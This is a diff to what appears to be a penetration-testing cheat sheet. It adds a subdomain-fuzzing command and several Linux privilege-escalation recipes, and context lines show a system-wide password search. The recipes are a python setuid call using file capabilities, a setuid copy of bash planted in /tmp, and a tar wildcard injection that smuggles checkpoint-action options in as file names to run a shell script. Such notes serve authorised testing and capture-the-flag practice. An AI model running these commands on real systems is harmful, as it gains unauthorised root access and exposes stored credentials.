@@ -933,6 +933,15 @@ Search for Passwords in  the whole system
     grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
     locate password | more
 
+*Search for Subdomains*
+
+Get the list from here
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt 
+
+    wfuzz -c -f sub-fighter -w top5000.txt -u '<url>' -H "HOST: FUZZ.<url>" --hw 290
+
+    --hw 290 to take out 404 pages
+
 **Post Exploitation**
 
 *Linux Post Exploitation*
@@ -1018,7 +1027,37 @@ start it with
 
     ftp-upload -h {HOST} -u {USERNAME} --password {PASSWORD} -d {SERVER_DIRECTORY} {FILE_TO_UPLOAD}
 
+*Capabilities*
+Get a list of programs that are allowed to be executed as root by the current user.
+Only works if +ep is present. 
 
+    getcap -r / 2>/dev/null
+
+Result should be something like this:
+
+    /usr/bin/python = cap_setuid+ed
+
+Get root with python
+
+    python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+*Create Root Bash*
+
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'
+    For execution:
+    /tmp/bash -p
+
+*Use tar when wildcard is in use*
+
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > target_path/shell.sh
+    chmod +x shell.sh
+    touch /home/andre/backup/--checkpoint=1
+    touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
+
+When bash shows up
+
+    /tmp/bash -p
+ 
 **Windows PW Cracking**
 
 *Crack Password Hash*
